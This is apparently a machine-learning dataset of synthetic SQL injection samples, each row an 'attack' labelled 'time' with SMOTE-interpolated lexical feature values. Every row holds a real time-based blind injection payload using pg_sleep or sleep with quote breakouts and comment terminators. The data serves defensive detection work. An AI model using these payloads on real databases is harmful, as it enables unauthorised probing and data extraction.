id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000775,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,1.281064212930878,95.16945870019467,28.0,3.627201089646886,28.23091168762167,18.0,38.29236467504867,10.646182337524333,0.29609360367132465,0.189450084285317,0.40261256789650535,0.11184374414685298,0.0,0.6461823375243334,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.6461823375243334,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.3538176624756665,0.6461823375243335,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000776,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.976286614157468,81.69188200658897,26.477665579987733,3.674138505425259,23.129442633312888,16.60710821330062,31.955331159975465,10.0,0.2833150544872478,0.20127456720355638,0.3918664959679997,0.12354388234119612,0.17411147333742238,0.8258885266625776,2.0,0.0,0.0,1.8258885266625777,0.0,4.0,0.17411147333742227,1.0,0.0,3.8258885266625775,0.17411147333742236,0.8258885266625775,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.825888526662578,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.825888526662578
SMOTE_000777,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.3004614761446137,68.58370372139478,25.687777791046088,3.6471066920993636,22.583703721394787,10.0,27.895925930348696,8.104074069651304,0.3290636279117414,0.14585573306266492,0.4067949130423648,0.11828572598322891,0.0,0.1040740696513035,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.10407406965130361,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000778,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,0.07875422869727429,96.74944980905613,22.053689326630828,2.816216748533165,28.03579288442055,2.0,52.74944980905613,13.964207115579448,0.28996240406598206,0.020680797463903583,0.5450224557941212,0.1443343426759931,0.0,1.0,0.0,0.0,1.0,0.0,0.0,10.946310673369172,0.017896442210275865,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9821035577897241,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.982103557789724
SMOTE_000779,attack,time,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  ",nearest_attack_euclidean,R000016,2.38180285765458,85.60180906972697,22.886231162779133,3.2341580684210944,33.658693488337406,1.5284422093052168,39.47155779069478,10.943115581389566,0.39011652805584585,0.018448797658317445,0.46369708884517985,0.1277375854406569,1.4146733720843505,0.5284422093052163,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.47155779069478365,0.5284422093052165,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000780,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,0.043441372941343315,57.032793282699394,17.98688268692024,2.8916515817970936,16.039351939239275,1.0,29.00655865653988,10.986882686920243,0.2811879932126339,0.01753458028220163,0.508608612966749,0.1926688135384155,2.9803240303803635,0.01967596961963647,0.0,0.0,0.0,1.0,0.0,5.0,0.993441343460121,0.993441343460121,0.0,1.0000000000000002,0.9934413434601208,0.0065586565398791374,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.006558656539879082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.006558656539879
SMOTE_000781,attack,time,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""chvi"" like ""chvi",nearest_attack_euclidean,R000015,3.9723230589999474,87.1775122422201,21.678105386576846,2.8842996081529018,19.499406855643258,6.856803917510435,46.42840195875522,14.392899510311196,0.21649551244872473,0.07350155463578337,0.5405261171782204,0.16947681573727155,1.5715980412447828,2.428401958755217,0.0,0.0,0.0,1.0,0.0,8.0,0.7857990206223915,0.0,0.6071004896888041,1.0000000000000002,0.39289951031119585,0.6071004896888041,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3928995103111959,0.6071004896888043,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000782,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,1.5685172238659804,59.69200376351923,23.663499529560095,3.5922144972435492,18.336500470439905,10.0,23.68250235219952,7.673000940879808,0.30788784320424517,0.16817272938321393,0.395864656215371,0.1280747711971699,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.336500470439904,0.0,0.33650047043990416,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.3365004704399041,0.0,0.6634995295600958,0.3365004704399042,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6634995295600958,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000783,attack,time,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,nearest_attack_euclidean,R000004,2.024205691661454,60.3384660474257,23.80307962845542,3.6894956738060816,21.53538641897028,10.0,21.732306790514862,7.070772837940561,0.35685381666401134,0.16594685898457176,0.3609003833678526,0.11629894098356433,1.5353864189702804,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,1.5353864189702806,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2676932094851403,0.2676932094851403,0.0,1.0,0.0,0.2676932094851403,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5353864189702806
SMOTE_000784,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,1.112627461221327,96.31406949837078,22.514447876221908,2.917184533925594,30.057791504887632,1.828517374592698,50.77072586970506,13.657034749185394,0.3129156224387228,0.018926731663756788,0.5264510282615829,0.1417066176359375,0.5144478762219082,0.8285173745926973,0.0,0.0,1.0,0.0,0.0,10.485552123778092,0.0,0.0,0.0,1.0000000000000002,0.17148262540730272,0.8285173745926973,0.0,0.8285173745926973,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000785,attack,time,"1  )   where 2044  =  2044 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000010,0.22942868628395371,75.92751929096237,22.0,3.319155024700036,15.0,18.0,33.142015432769895,9.785503858192474,0.19770692832531828,0.23724831399038193,0.43621925188141436,0.1288255058028854,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,2.0,0.0,4.785503858192473,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000786,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,1.8838474530704545,91.63213923398692,22.398291137823243,2.9139060231026965,29.038974682693947,2.0,48.19487341346973,12.398291137823243,0.31976266833693423,0.022160515886765847,0.524028321176528,0.13404849459977194,0.6796582275646488,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,10.038974682693947,0.0,0.0,0.0,1.0000000000000002,0.6796582275646488,0.0,0.0,0.6796582275646488,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.3203417724353512,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.320341772435351
SMOTE_000787,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,0.2585089425189244,66.2068076517465,24.137871767831,3.561424118605501,19.275743535662,10.0,27.0689358839155,9.862128232169,0.29101223714767427,0.15106102843270422,0.40886384754968547,0.1490628868699361,0.9310641160845001,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.9310641160845001,1.0,0.0,3.0,0.9310641160845001,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000788,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,2.1853407291130322,82.58641772126298,21.324618019269288,3.1422334639179588,32.036672375083455,1.6125636634551181,38.77487267308976,10.162309009634644,0.38426058602606705,0.020286078520099463,0.47292111626299216,0.12253221919084126,1.1623090096346436,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.38743633654488113,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.3874363365448812,0.6125636634551187,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000789,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,1.480509012155994,88.5378808145348,23.42513440512993,3.313536878907759,36.587791211114855,1.2624775991450115,39.47504480170998,11.212567202564966,0.41046255660049363,0.014837653636948389,0.44845273542411374,0.12624705433844427,2.2125672025649656,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.7375224008549885,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.7375224008549885,0.26247759914501145,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000790,attack,time,1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoin'  =  'zoin,nearest_attack_euclidean,R000019,1.8786473858304962,84.35642909733416,26.0,3.5453385336486725,27.460360035337878,10.0,35.57428361066336,11.32178545133292,0.3248874983680171,0.1185592783879034,0.42226108386879635,0.13429213937528314,3.034643646001239,-1.1102230246251565e-16,0.64357090266584,0.0,0.0,1.6782145486670799,0.0,4.96535635399876,0.0,1.0,0.0,2.32178545133292,1.0,0.0,0.32178545133292,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.6782145486670803,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.67821454866708
SMOTE_000791,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,0.7573537316555569,93.68722608012854,27.702567315870933,3.6403801666857243,28.95898560554827,16.810269263483736,37.36412023729014,10.553850973806401,0.31016915216502133,0.17791131593893705,0.39912481013448986,0.11279472176155181,0.0,0.8512836579354669,2.0,0.0,0.0,1.851283657935467,0.0,4.851283657935467,0.0,1.0,0.0,3.8512836579354666,0.0,0.851283657935467,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.851283657935467,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.851283657935467
SMOTE_000792,attack,time,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",nearest_attack_euclidean,R000030,0.0022995429560541654,96.99182560896898,21.998832229852713,2.80862260381116,27.999610743284236,2.0,52.99416114926356,13.998053716421188,0.2886857196211936,0.02062077438714896,0.5463736942760729,0.14431981171558456,0.0,0.9996107432842374,0.0,0.0,1.0,0.0,0.0,10.998832229852713,0.0,0.0,0.0,1.0000000000000002,0.0,0.9996107432842374,0.0,0.9996107432842376,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.9996107432842376,0.0003892567157624538,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000793,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.9049955195126297,95.84283213051398,23.526424819577098,2.9198066822795155,29.684283213051398,2.0,50.789982491359794,13.368566426102797,0.31114423656523066,0.02100937677265978,0.528773579302823,0.13907280735928668,0.8421416065256994,0.1578583934743007,0.0,0.0,1.0,0.0,0.0,10.526424819577098,0.0,0.0,0.0,1.0000000000000002,0.8421416065256992,0.15785839347430078,0.0,0.8421416065256992,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.15785839347430064,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.157858393474301
SMOTE_000794,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,4.439851694763349,65.54286834861547,24.45713165138453,3.7222379800558683,20.828526605538112,10.914263302769056,24.257210091692833,9.542868348615473,0.3180345588209374,0.16664631573347388,0.36977119362217004,0.14554793182341877,1.4571316513845276,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,3.0857366972309443,0.5428683486154723,0.5428683486154724,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5428683486154723,0.0,0.4571316513845277,0.5428683486154722,0.0,0.5428683486154723,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4571316513845277,0.4571316513845277,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000795,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000009,2.8858150531962337,64.63378250951428,25.36621749048573,3.767829009066531,21.732434980971465,10.0,22.901347528542804,10.0,0.33671847563052687,0.15474956792255146,0.3537823885243702,0.15474956792255146,2.366217490485732,-1.1102230246251565e-16,0.633782509514268,0.0,0.0,1.0,0.0,3.316891254757134,0.316891254757134,0.316891254757134,0.0,3.0,1.0,0.0,0.316891254757134,0.683108745242866,0.0,1.0,1.0,0.0,0.0,0.0,0.683108745242866,1.0,0.0,0.6831087452428661,0.316891254757134,0.683108745242866,0.316891254757134,0.0,0.0,0.0,0.0,0.0,0.0,0.683108745242866,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.683108745242866
SMOTE_000796,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,2.164130304777062,75.68778732840609,24.78129788806768,3.344262719097667,19.593765962689226,10.0,35.31272347764918,10.78129788806768,0.26182146957091457,0.13403561199554015,0.4620494472993943,0.14209347113415097,0.593765962689227,0.40623403731077296,2.0,0.0,0.0,1.0,0.0,5.781297888067681,0.0,1.0,0.0,3.0,0.593765962689227,0.40623403731077296,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.593765962689227,0.406234037310773,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000797,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,1.150871409205083,84.91427870424228,26.982855740848457,3.58705918392178,23.779426889018147,16.37256918535753,34.965711481696914,9.796571148169692,0.2807335816077908,0.19061097606937039,0.41198046517876197,0.11667497714407682,0.0,0.20342885183030884,2.0,0.0,0.0,1.796571148169691,0.0,4.796571148169691,0.0,1.0,0.0,3.796571148169691,0.0,0.2034288518303089,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.7965711481696911,1.0,0.7965711481696911,0.2034288518303089,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.796571148169691
SMOTE_000798,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,1.9306493143228938,68.82948927222768,21.56997311959093,3.311100222785696,15.0,14.559784956727444,30.129758076318375,9.13994623918186,0.22224757297729172,0.20738303510253359,0.437032856386201,0.13333653553397368,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.5699731195909306,0.0,4.56997311959093,0.0,0.0,1.0,3.5699731195909306,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5699731195909306,0.0,0.43002688040906945,0.5699731195909306,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.5699731195909306
SMOTE_000799,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,0.7587190831179998,78.96740405164928,19.645087837315064,2.9452984923499708,27.387052702389038,2.0,39.93526351194519,9.645087837315062,0.348524202018479,0.025527005834224,0.5045612271325307,0.12138756501476623,0.12901756746301263,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.387052702389038,0.0,0.0,0.0,1.0000000000000002,0.12901756746301252,0.0,0.0,0.12901756746301257,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.8709824325369875,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.870982432536987
SMOTE_000800,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'yfvu' like 'yfvu,nearest_attack_euclidean,R000017,0.8351940198280617,91.58352561328067,25.0,3.412801988643119,38.58352561328068,1.1416474386719333,39.85835256132807,12.0,0.420381766744899,0.012642788726934723,0.43574112756474714,0.13123431696341908,2.5750576839842028,0.14164743867193236,0.0,0.0,1.0,0.0,0.0,8.0,0.14164743867193244,0.0,0.0,1.0000000000000002,0.8583525613280675,0.14164743867193255,0.0,0.14164743867193236,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.8583525613280676,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.858352561328068
SMOTE_000801,attack,time,"1""  )   as eoer where 8667  =  8667 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000027,0.5858024815191097,93.73826017600905,27.672173859693004,3.65688033295021,28.033043158158023,18.0,37.03304315815802,10.672173859693004,0.29833018297949754,0.19288251102423015,0.39477143849161267,0.11401586750465964,0.0,1.0,2.0,0.0,0.0,2.0,0.0,4.672173859693004,0.0,1.0,0.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000802,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000009,2.932948668025663,61.67460739924974,25.335602114071353,3.79245265217561,21.33900528517838,10.0,21.332198942964325,9.00340317110703,0.344895934229351,0.16262443147135489,0.3473393577207983,0.14514027657849576,2.0034031711070286,0.3321989429643237,0.6643978859286475,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.0,3.0,0.6678010570356763,0.3321989429643237,0.33219894296432373,0.6678010570356763,0.0,1.0,1.0,0.0,0.0,0.0,0.6678010570356762,0.6678010570356763,0.0,1.0,0.0,0.6678010570356763,0.33219894296432373,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6678010570356765
SMOTE_000803,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.032223114296094535,84.84284679413148,26.968569358826297,3.697897232709604,23.960711698532872,17.937138717652594,32.952854038239444,9.992142339706573,0.2824311622291653,0.21130960157576537,0.38844862426135995,0.11781061193370931,0.0,1.0,2.0,0.0,0.0,1.992142339706574,0.0,4.0,0.0,1.0,0.0,3.9921423397065743,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9921423397065743,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9921423397065743
SMOTE_000804,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,0.17882072382041597,57.56421814894272,23.924770913474305,3.6335300466624907,17.887156370211454,10.300916346102788,22.300916346102788,7.075229086525697,0.31174756004412374,0.17824318962924746,0.38711974474929794,0.1228895055773308,0.0,0.9623854567371517,2.0,0.0,0.0,1.0376145432628483,0.0,3.037614543262848,0.0,0.0,0.03761454326284838,3.0376145432628485,0.0,0.9623854567371517,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
